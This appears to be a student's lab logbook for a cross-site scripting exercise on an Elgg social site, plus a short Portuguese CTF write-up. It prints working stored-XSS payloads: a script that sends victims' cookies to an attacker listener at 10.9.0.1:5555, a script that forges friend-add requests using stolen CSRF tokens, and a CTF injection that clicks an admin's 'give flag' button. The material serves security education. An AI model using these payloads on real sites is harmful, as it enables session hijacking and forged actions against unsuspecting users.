# Cross Site Scripting - XSS

## Task 1
If we loggin as Alice and go edit her profile, if we insert the text: <script>alert(’XSS’);</script>
on a field such as "Brief description" and save the changes made, that will launch a popup window with the message "XSS" everytime someone sees Alice's profile (see "logbook10 task1.png"). This also means that the input field on the "Brief description" (used in our case) does not check HTML injection.

## Task 2
This task is similar to the first one, but this time we are displaying the user's cookies on the popup window and not just some text. By doing the same thing as in the task 1, but by placing the text: <script>alert(document.cookie);</script>
we can achieve this result (see "logbook10 task2.png").

## Task 3
The previous task we printed the user's cookies on a popup window, but only the user could see that. On this task we used an "image" with a src parameter that the browser will look for by a GET request. That request will be redirected to the attacker (us) since we inserted our server on the src attribute. Since we also attached an additional text to get information about the cookies, basically the browser used by the victim (Alice in our case) is going to send a GET Request to a server (10.9.0.1, more specifically to the port 5555) that our machine is listenning to. So, by placing the text:
<script>document.write('<img src=http://10.9.0.1:5555?c='+ escape(document.cookie) + '   >');</script>
in an input field like the "Brief description" (as in the previous tasks) we can get Alice's cookies displayed in our machine (see "logbook10 task3.png").

## Task 4
In this task we want to make everyone that sees Samy's profile his friend. To achieve this we needed to insert the text:
<script type="text/javascript">
window.onload = function () {
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
Ajax=new XMLHttpRequest();
Ajax.open("GET", sendurl, true);
Ajax.send();}</script>
on the "About me" field on Samy's profile. On the text above what we needed to change was the 'sendurl' variable. The value of that variable basically is the url that we get when adding a friend (using the HTTP Header Live extension in our browser, see "logbook10 task4.png"). This url comes with some defined tokens that we must replace by the ones gotten by our script, so that the url has the correct updated tokens, that's why we keep the initial part of the url and then add the 'ts' and 'token' variables. Additional note: we can see that Samy's id is 59. If we wanted to do this for other users we just need to change the number on the url after "friend=" (for example, Alice is 56 and Charlie is 58).

# CTF 10

## Desafio #1

O formulário é vulneravél a XSS. Podemos injetar código que clica no botão de
give flag pelo utilizador:

`<script>document.getElementById("giveflag").click();</script>`

Quando o admin for ver a página, clicará no botão de give flag.



